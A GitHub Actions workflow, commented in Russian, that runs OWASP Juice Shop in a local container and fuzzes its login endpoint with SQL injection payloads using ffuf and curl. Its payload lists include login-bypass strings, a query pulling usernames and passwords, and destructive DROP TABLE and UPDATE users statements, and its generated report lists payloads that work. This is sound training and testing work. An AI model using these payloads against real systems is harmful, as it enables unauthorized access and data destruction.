name: Juice Shop SQL Injection Fuzzing

on:
  push:
    branches: [ main ]
  workflow_dispatch:  # Для ручного запуска

permissions:
  contents: write
  pull-requests: write
  security-events: write
  actions: read

jobs:
  ffuf-sql-injection:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Start Juice Shop container
        run: |
          # Запускаем Juice Shop
          docker run -d \
            --name juice-shop \
            -p 3000:3000 \
            bkimminich/juice-shop:latest
          
          echo "Waiting for Juice Shop to start..."
          # Увеличиваем время ожидания
          sleep 30
          
          # Проверяем доступность
          if curl -s -f http://localhost:3000 > /dev/null; then
            echo "Juice Shop is up and running!"
          else
            echo "WARNING: Juice Shop might not be fully ready, but continuing..."
          fi
          
      - name: Install ffuf
        run: |
          # Устанавливаем ffuf
          wget https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz
          tar -xzf ffuf_2.1.0_linux_amd64.tar.gz
          chmod +x ffuf
          sudo mv ffuf /usr/local/bin/
          
      - name: Prepare payloads from local file
        run: |
          echo "Looking for SQL-Injection.txt file..."
          
          # Ищем файл в разных местах
          find . -name "SQL-Injection.txt" -type f 2>/dev/null || echo "File not found with find"
          
          # Проверяем наличие файла в разных возможных местах
          if [ -f ".github/workflows/SQL-Injection.txt" ]; then
            echo "Found SQL-Injection.txt in .github/workflows/"
            SQL_FILE=".github/workflows/SQL-Injection.txt"
          elif [ -f "SQL-Injection.txt" ]; then
            echo "Found SQL-Injection.txt in root directory"
            SQL_FILE="SQL-Injection.txt"
          else
            echo "SQL-Injection.txt not found, creating basic payloads"
            SQL_FILE=""
          fi
          
          # Создаем папку для payloads
          mkdir -p payloads
          
          if [ -n "$SQL_FILE" ]; then
            echo "Using existing file: $SQL_FILE"
            cp "$SQL_FILE" payloads/base-payloads.txt
            echo "Copied $(wc -l < payloads/base-payloads.txt) lines from $SQL_FILE"
          else
            # Создаем базовые payloads если файл не найден
            echo "Creating basic SQL injection payloads..."
            cat > payloads/base-payloads.txt << 'EOF'
            '
            ''
            `
            ``
            "
            ""
            /
            //
            \
            \\
            ;
            ' or "
            -- 
            # 
            ' OR '1
            ' OR 1 -- -
            " OR "" = "
            " OR 1 = 1 -- -
            ' OR '' = '
            EOF
          fi
          
          # Добавляем специфичные payloads для SQLite (Juice Shop использует SQLite)
          cat > payloads/sqlite-specific.txt << 'EOF'
          ' OR '1'='1
          ' OR 1=1--
          ' OR 1=1;--
          admin' OR '1'='1
          admin' OR 1=1--
          ' UNION SELECT null,null--
          ' UNION SELECT 1,2--
          ' UNION SELECT username,password FROM users--
          ' OR 1=1 LIMIT 1--
          '; SELECT SLEEP(5)--
          ' OR 1=1 AND (SELECT 1 FROM sqlite_master)--
          ' OR EXISTS(SELECT * FROM sqlite_master)--
          ' OR 1=1 AND (SELECT sql FROM sqlite_master WHERE type='table')--
          admin@juice-sh.op' OR '1'='1
          admin@juice-sh.op' OR 1=1--
          ' OR 'a'='a
          ' OR 'x'='x
          ' IS NULL;--
          '; DROP TABLE users;--
          '; UPDATE users SET password='hacked';--
          admin@juice-sh.op'--
          admin@juice-sh.op' OR '1'='1'--
          ' OR '1'='1' OR '
          ') OR ('1'='1
          ')) OR (('1'='1
          ' OR 1=1 LIMIT 1
          ' OR '1'='1' LIMIT 1
          EOF
          
          # Комбинируем файлы
          cat payloads/base-payloads.txt payloads/sqlite-specific.txt > payloads/all-payloads.txt
          
          # Удаляем пустые строки и дубликаты, обрезаем пробелы
          grep -v '^$' payloads/all-payloads.txt | sed 's/^[ \t]*//;s/[ \t]*$//' | sort -u > payloads/unique-payloads.txt
          
          echo "Total unique payloads prepared: $(wc -l < payloads/unique-payloads.txt)"
          echo "First 5 payloads:"
          head -5 payloads/unique-payloads.txt
          
      - name: Test login endpoint (baseline)
        run: |
          echo "Testing baseline login with invalid credentials..."
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d '{"email":"test@test.com","password":"test"}' \
            -o baseline-response.txt \
            -s -w "Status: %{http_code}, Size: %{size_download}, Time: %{time_total}s\n"
          echo "Baseline response saved"
          
      - name: Run ffuf fuzzing
        run: |
          echo "Starting SQL injection fuzzing on login endpoint..."
          echo "Using $(wc -l < payloads/unique-payloads.txt) payloads"
          
          # Создаем простой тест для проверки эндпоинта
          echo "Testing if endpoint is accessible..."
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d '{"email":"test","password":"test"}' \
            -s -w "Status: %{http_code}\n" \
            -o /dev/null
          
          # Фаззинг параметра email
          echo -e "\n=== Fuzzing email parameter ==="
          ffuf -u http://localhost:3000/rest/user/login \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"email":"FUZZ","password":"password"}' \
            -w payloads/unique-payloads.txt \
            -t 10 \
            -p 0.1 \
            -o ffuf-results-email.json \
            -of json \
            -mc all \
            -v 2>&1 | tee ffuf-output-email.txt
          
          # Фаззинг параметра password
          echo -e "\n=== Fuzzing password parameter ==="
          ffuf -u http://localhost:3000/rest/user/login \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
            -w payloads/unique-payloads.txt \
            -t 10 \
            -p 0.1 \
            -o ffuf-results-password.json \
            -of json \
            -mc all \
            -v 2>&1 | tee ffuf-output-password.txt
          
      - name: Simple results analysis
        run: |
          echo "=== Simple analysis of fuzzing results ==="
          
          echo "1. Email parameter results:"
          if [ -f "ffuf-results-email.json" ]; then
            echo "File exists, looking for non-401 responses..."
            # Используем grep для простого анализа без jq
            grep -o '"status":[0-9]*' ffuf-results-email.json | sort | uniq -c | sort -rn
          else
            echo "No ffuf-results-email.json file found"
          fi
          
          echo -e "\n2. Password parameter results:"
          if [ -f "ffuf-results-password.json" ]; then
            echo "File exists, looking for non-401 responses..."
            grep -o '"status":[0-9]*' ffuf-results-password.json | sort | uniq -c | sort -rn
          else
            echo "No ffuf-results-password.json file found"
          fi
          
      - name: Quick manual tests
        run: |
          echo "=== Quick manual SQL injection tests ==="
          
          echo "1. Testing with: ' OR '1'='1"
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"' OR '1'='1\",\"password\":\"anything\"}" \
            -s -w "\nStatus: %{http_code}\n"
          
          echo -e "\n2. Testing with: admin@juice-sh.op'--"
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
            -s -w "\nStatus: %{http_code}\n"
          
          echo -e "\n3. Testing with: admin@juice-sh.op' OR 1=1--"
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"admin@juice-sh.op' OR 1=1--\",\"password\":\"anything\"}" \
            -s -w "\nStatus: %{http_code}\n"
          
      - name: Get Juice Shop logs
        if: always()
        run: |
          echo "Getting Juice Shop logs..."
          docker logs juice-shop > juice-logs.log 2>&1 || true
          
      - name: Stop Juice Shop container
        if: always()
        run: |
          echo "Stopping Juice Shop container..."
          docker stop juice-shop 2>/dev/null || true
          docker rm juice-shop 2>/dev/null || true
          
      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: fuzzing-results
          path: |
            ffuf-results-*.json
            ffuf-output-*.txt
            baseline-response.txt
            juice-logs.log
            payloads/
          retention-days: 7
          
      - name: Create simple report
        if: always()
        run: |
          echo "Creating simple report..."
          
          cat > report.md << 'EOF'
          # SQL Injection Fuzzing Report
          
          ## Summary
          - Application: OWASP Juice Shop
          - Target: /rest/user/login
          - Test Date: $(date)
          
          ## Manual Test Results
          Manual tests were executed with common SQL injection payloads.
          
          ## Next Steps
          1. Check the uploaded artifacts for detailed results
          2. Look for HTTP 200 or 302 responses
          3. Try successful payloads manually
          
          ### Common Juice Shop SQL Injection Payloads:
          - `admin@juice-sh.op'--`
          - `' OR '1'='1`
          - `admin@juice-sh.op' OR 1=1--`
          EOF
          
      - name: Upload report
        uses: actions/upload-artifact@v4
        with:
          name: report
          path: report.md
